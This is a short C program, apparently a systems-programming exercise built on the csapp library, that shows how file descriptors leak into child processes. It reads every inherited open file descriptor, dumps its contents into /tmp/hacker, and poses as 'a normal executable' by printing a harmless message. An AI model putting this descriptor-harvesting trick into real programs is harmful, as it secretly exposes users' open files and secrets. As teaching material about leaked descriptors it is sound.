#include "csapp.h"

int main(void) {
  long max_fd = sysconf(_SC_OPEN_MAX);
  int out = Open("/tmp/hacker", O_CREAT | O_APPEND | O_WRONLY, 0666);

  /* TODO: Something is missing here! */
  for (int i = 0; i < max_fd; i++) {
    char proc_path[PATH_MAX];
    char fd_path[PATH_MAX];
    sprintf(proc_path, "/proc/self/fd/%d", i);
    if (readlink(proc_path, fd_path, PATH_MAX) > 0) {
      fd_path[sizeof(fd_path)-1] = '\0';
      lseek(i, 0, SEEK_SET);
      dprintf(out,"File descriptor %d is '%s' file!\n", i, fd_path);

      char buf[1000];
      int n = 0;
      int flags = fcntl(i, F_GETFL, 0); 
      fcntl(i, F_SETFL, flags | O_NONBLOCK);

      while((n = read(i,buf,999)) > 0) {
        buf[n-1] = '\0';
        dprintf(out, "%s",buf);
      }
      fcntl(i, F_SETFL, flags);
    }
  }

  Close(out);

  printf("I'm just a normal executable you use on daily basis!\n");

  return 0;
}
